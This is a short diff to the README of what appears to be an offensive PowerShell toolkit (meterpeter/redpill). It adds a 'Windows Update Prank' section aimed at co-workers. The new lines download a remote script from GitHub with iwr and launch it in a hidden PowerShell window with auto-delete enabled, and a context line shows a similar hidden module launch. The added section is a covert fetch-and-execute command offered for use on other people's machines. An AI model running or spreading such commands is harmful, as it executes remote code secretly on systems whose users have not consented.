@@ -107,6 +107,14 @@ Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papa
 
 ![manualpapacat](https://github.com/r00t-3xp10it/redpill/assets/23490060/23bd0050-dc17-491f-acc9-bc10a09e392e)
 
+<br />
+
+#### Windows Update Prank ( prank your co-workers )
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FWUprank.ps1" -outfile "FWUprank.ps1"
+Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on";exit
+```
+
 ---
 
 <br /><br />
